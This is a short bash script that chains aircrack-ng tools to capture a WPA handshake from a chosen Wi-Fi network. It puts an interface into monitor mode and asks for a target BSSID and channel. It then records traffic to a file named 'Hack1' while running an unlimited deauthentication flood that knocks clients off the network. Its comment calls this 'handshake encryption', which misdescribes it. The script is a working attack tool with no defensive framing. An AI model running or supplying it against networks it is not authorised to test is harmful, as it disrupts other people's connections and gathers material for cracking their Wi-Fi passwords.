#!/bin/bash

# WPA handshake encryption

echo ' '

read -p '[?] Enter name interface : ' Interface

airmon-ng start $Interface

MON=mon
airodump-ng $Interface$MON --encrypt WPA

read -p '[?] Enter BSSID : ' BSSID
read -p '[?] Enyer CHANNL : ' CHANNL

airodump-ng $Interface$MON -d $BSSID -c $CHANNL

xterm -hold -e airodump-ng -w Hack1 -c $CHANNL --bssid $BSSID $Interface$MON & xterm -hold -e aireplay-ng --deauth 0 -a $BSSID $Interface$MON

airmon-ng stop $Interface$MON